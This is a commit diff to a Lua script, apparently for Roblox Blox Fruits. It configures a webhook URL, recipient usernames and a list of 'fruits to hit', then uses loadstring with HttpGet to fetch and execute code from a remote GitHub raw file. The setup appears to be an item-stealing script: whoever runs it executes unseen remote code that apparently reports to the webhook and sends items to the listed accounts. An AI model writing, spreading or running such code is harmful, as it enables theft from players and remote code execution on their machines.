cf6370fe1e5e3463aa14ac97be9a2facceaa95e5
rashed1993-call <ra9496061@gmail.com>
2025-04-15 21:43:57 +0400

    Redz.lua

--- Redz.lua
+++ Redz.lua
@@ -1,7 +1,6 @@
 
-
-Webhook = "https://docs.google.com/document/d/19db08nvSH1NIoFAaiEMfUgHx3mnQ1HM0/mobilebasic" -- << Your Webhook
-Usernames = {"x9foora1", "vin1115gh"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti",} -- << Fruits you want
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=QkVrX1U3MTB5ZERlY1FTMFI4TWZ2UTpjNmxVQW9YdGxrcmlqOUtFQU5zX0pZU1hfdzJBNGdUUTgzUml5WklLYl9hY2VDY1JNRUpfbWdMMS1UN0NhNElGYXMxN3VnOUtxSXBvSVI2Mk9OVUg0RjlEVVNHZ1dPb21lMDEwMEdnZkRRNFk4V3F5WDdmVXRRVTBLMGFQc3RPMHJWUUdWSnBkZEFCaFA2XzVTTUJQd3kyNU15dnNlcG1Yazk4SElWckdadTQ" -- << Your Webhoook
+Usernames = {"x9foora1", "x9foora1"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
